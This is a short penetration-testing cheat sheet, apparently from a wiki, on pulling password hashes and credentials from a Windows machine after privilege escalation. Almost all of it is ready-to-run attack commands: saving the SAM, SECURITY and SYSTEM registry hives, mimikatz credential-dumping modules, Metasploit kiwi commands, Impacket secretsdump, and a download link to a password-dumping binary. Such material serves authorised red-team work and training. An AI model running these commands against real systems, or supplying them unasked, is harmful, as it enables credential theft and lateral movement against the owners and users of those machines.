---
description: In this topic your privilege has to be high privilege.
---

# Password Extraction

### samdump2

```
C:> reg save HKLM\SAM c:\SAM
C:> reg save HKLM\System c:\System

$ samdump2 System SAM
```

### mimikatz.exe

Need to match architectures.

```
privilege::debug
20 ‘OK’

sekurlsa::logonPasswords
lsadump::sam
lsadump::lsa /patch
lsadump::secrets
kerberos::list
```

### Metasploit

```
load kiwi

creds_all
lsa_dump_lsa
lsa_dump_secrets
kerberos_list
```

### Impacket

Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your local system.

```
C:> reg.exe save hklm\sam c:\windows\temp\sam.save
C:> reg.exe save hklm\security c:\windows\temp\security.save
C:> reg.exe save hklm\system c:\windows\temp\system.save

$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### samjuicer32.exe

windows 2000 service pack3 5.00.2195

[https://github.com/basicScandal/WinHackingBin/blob/master/Passdump/samjuicer32.exe](https://github.com/basicScandal/WinHackingBin/blob/master/Passdump/samjuicer32.exe)

```
C:\> samjuicer32.exe
```
